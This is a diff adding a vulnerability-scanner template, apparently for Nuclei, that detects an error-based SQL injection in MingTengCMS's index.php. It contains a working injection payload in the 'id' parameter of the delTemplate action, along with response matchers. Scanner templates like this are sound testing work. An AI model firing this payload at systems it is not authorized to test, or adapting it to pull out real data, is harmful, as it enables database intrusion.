@@ -1,0 +1,29 @@
+id: poc-yaml-mintennet-cms-index-php-sqli
+info:
+  name: MingTengCMS index.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The template detects an SQL Injection vulnerability in MingTengCMS index.php file.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/index.php?m=mingteng&c=Smstemplate&a=delTemplate&id=extractvalue(1%2C%20concat(0x7e%2C(select+md5(%7B%7B.t1%7D%7D))%2C0x7e))"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "SQLSTATE"
+      - type: regex
+        regex:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 500
